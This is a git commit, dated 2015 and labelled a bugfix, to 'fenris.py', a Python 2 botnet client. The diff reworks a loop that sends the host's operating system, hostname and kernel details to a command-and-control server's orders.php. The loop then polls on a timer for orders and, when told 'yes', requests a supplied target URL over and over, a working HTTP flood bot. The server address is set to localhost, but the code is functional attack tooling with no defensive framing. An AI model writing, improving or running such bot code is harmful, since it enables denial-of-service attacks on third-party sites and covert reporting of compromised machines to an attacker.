bce557b5d9064fbbeb234f1e16dab5a58dc55e80
Daniel Haake <it.sec.operations@danielhaake.de>
2015-03-12 23:04:06 +0100

    BUGFIX: fenris.py

--- fenris.py
+++ fenris.py
@@ -22,31 +22,31 @@
 
 import urllib2
 import platform
+import time
 
 
 candc = "127.0.0.1"
 # extract system information
 systemData = platform.uname()
+currentTime = time.time()
+timeFactor = 20
 
 while(True):
-    # get fenris orders
-    orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read().split("\n")
+        # get fenris orders
+        orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read().split("\n")
+        time.sleep(timeFactor)
+    
+        # perform action (for extra cuteness)
+        doit = orders[0]
+        target = orders[1]
 
-    # perform action (for extra cuteness)
-    doit = orders[0]
-    target = orders[1]
-
-    if doit == "yes":
-        # let the cuteness begin
-        # command refresh intervall = 10
-        count = 0
-        while(True):
-            if count%10 == 0:
-                orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
-                if orders[0] == "no":
-                    break
-                else:
-                    target = orders[1]
-                count = 0
-            urllib2.urlopen(target)
-            count += 1
+        if doit == "yes":
+                # let the cuteness begin
+                while(True):
+                        if (int(time.time())-int(currentTime))%timeFactor == 0:
+                                orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read().split("\n")                
+                        if orders[0] == "no":
+                                break
+                        else:
+                                target = orders[1]
+                                urllib2.urlopen(target)
